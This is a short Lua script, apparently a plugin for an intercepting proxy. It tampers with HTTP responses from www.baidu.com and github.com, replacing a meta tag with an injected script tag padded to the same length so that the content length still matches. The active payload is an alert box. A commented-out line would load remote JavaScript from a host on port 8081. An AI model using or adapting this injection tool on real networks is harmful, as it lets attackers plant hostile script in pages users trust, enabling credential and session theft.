--local zlib = require "zlib"
--local buffer = {}

--local script = '<script src="https://wifi.network:8081/crap.js"></script>'
local script = '<script>alert("CRAP!");</script>'
local scriptLen = string.len(script)

function tableLen(t)
	local count = 0
	for _ in pairs(t) do count = count + 1 end
	return count
end 

function matchHost(host, html, pattern)
	for matched in string.gmatch(html, pattern) do
		if (string.len(matched) >= scriptLen) then
			print ("found ========== " .. matched) 	
			return string.gsub(matched, '-', '.') --HOLY SHIT
		end	
	end
	return nil
end

function padding(src)
	print("padding ============ src    " .. src)
	if (string.len(src) < scriptLen) then
		print("[WARN]: src.length must be >= script.length.")
		return nil
	end
	local n = string.len(src) - scriptLen
	return string.rep(" ", n)..script
end

function modify(data, ctx, host) -- response only
	print("================= BEGIN", host)
	if (host == "www.baidu.com" ) then

		local matched = matchHost(host, data, "<meta.->")
		if (matched) then 
			local dst = padding(matched)				
			data = string.gsub(data, matched, dst)	
			print("================== SUCCESS:\n" .. data)
			return data
		end
	elseif ( host == "github.com" ) then
		local matched = matchHost(host, data, "<meta.->")
		if (matched) then 
			local dst = padding(matched)				
			data = string.gsub(data, matched, dst)	
			print("================== SUCCESS:\n" .. data)
			return data
		end
	end

    return nil
end 
